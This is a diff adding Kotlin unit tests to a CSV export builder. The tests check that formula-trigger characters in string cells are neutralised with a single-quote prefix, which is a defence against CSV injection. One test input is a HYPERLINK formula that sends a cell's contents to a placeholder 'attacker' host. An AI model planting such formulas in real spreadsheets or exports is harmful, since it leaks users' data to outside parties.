@@ -3,6 +3,7 @@ package beer.thierry.centsibleexport.render.impl
 import org.junit.jupiter.api.Assertions.assertEquals
 import org.junit.jupiter.api.Assertions.assertTrue
 import org.junit.jupiter.api.Test
+import java.math.BigDecimal
 
 class CsvBuilderTest {
 
@@ -44,5 +45,51 @@ class CsvBuilderTest {
             .row("c", "d")
             .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
         assertTrue(out.contains("a,b\r\nc,d\r\n"))
+    }
+
+    @Test
+    fun `string cells starting with a formula trigger are prefixed with a single quote`() {
+        val out = CsvBuilder()
+            .row("=1+1", "-2+3", "+5", "@SUM(A1)")
+            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
+        assertEquals("'=1+1,'-2+3,'+5,'@SUM(A1)\r\n", out)
+    }
+
+    @Test
+    fun `leading tab and carriage-return string cells are neutralized with a single quote`() {
+        val out = CsvBuilder()
+            .row("\tdanger", "\rdanger")
+            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
+        // Both gain a leading single quote; the CR cell is additionally RFC4180-quoted (CR is structural).
+        assertTrue(out.contains("'\tdanger"), "tab cell should be prefixed: $out")
+        assertTrue(out.contains("'\rdanger"), "carriage-return cell should be prefixed: $out")
+    }
+
+    @Test
+    fun `the HYPERLINK exfiltration payload is neutralized`() {
+        val out = CsvBuilder()
+            .row("""=HYPERLINK("http://attacker/?d="&A1,"open")""")
+            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
+        // The cell also contains a comma and quotes, so RFC4180 wraps it in double-quotes; the
+        // security-relevant property is that a single quote now precedes the leading '='.
+        assertTrue(out.contains("'=HYPERLINK"), "payload should be prefixed with the text-marker quote: $out")
+    }
+
+    @Test
+    fun `non-string cells are never treated as formulas`() {
+        // A negative amount stringifies starting with '-' but is numeric data, not a formula:
+        // sanitization must apply to String cells only, leaving BigDecimal/Int untouched.
+        val out = CsvBuilder()
+            .row("balance", BigDecimal("-50.00"), -3)
+            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
+        assertEquals("balance,-50.00,-3\r\n", out)
+    }
+
+    @Test
+    fun `safe string cells are passed through unchanged`() {
+        val out = CsvBuilder()
+            .row("Groceries", "Rent payment")
+            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
+        assertEquals("Groceries,Rent payment\r\n", out)
     }
 }
